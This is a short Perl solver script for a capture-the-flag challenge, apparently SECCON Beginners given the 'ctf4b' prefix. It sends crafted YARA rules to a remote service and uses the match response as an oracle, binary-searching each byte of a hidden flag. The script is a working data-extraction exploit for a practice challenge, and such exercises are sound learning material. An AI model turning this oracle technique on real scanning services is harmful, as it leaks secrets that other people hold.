#!/usr/bin/perl

use strict;
use warnings;

use IO::Socket;

if (@ARGV != 2) {
	die "Usage: solve.pl host port\n";
}

my $host = $ARGV[0];
my $port = int($ARGV[1]);

sub query {
	my ($complete, $begin, $end) = @_;
	my $sock = new IO::Socket::INET(PeerAddr => $host, PeerPort => $port, Proto => "tcp");
	print $sock "rule meow {\n";
	print $sock "    strings:\n";
	print $sock sprintf("        \$meow = /$complete\[\\x%02x-\\x%02x\]/\n", $begin, $end);
	print $sock "    condition:\n";
	print $sock "        \$meow\n";
	print $sock "}\n";
	print $sock "\n";
	my $yes = 0;
	while (my $line = <$sock>) {
		if (index($line, "matched: [meow]") >= 0) {
			$yes = 1;
		}
	}
	close $sock;
	return $yes;
}

my $result = "ctf4b";
my $queryData = $result;

until (substr($result, length($result) - 1) eq "}") {
	my $l = 0;
	my $r = 255;
	while ($l < $r) {
		my $m = ($l + $r) >> 1;
		if (&query($queryData, $l, $m)) {
			$r = $m;
		} else {
			$l = $m + 1;
		}
	}
	$result .= chr($l);
	$queryData .= sprintf("\\x%02x", $l);
	print "$result\n";
}
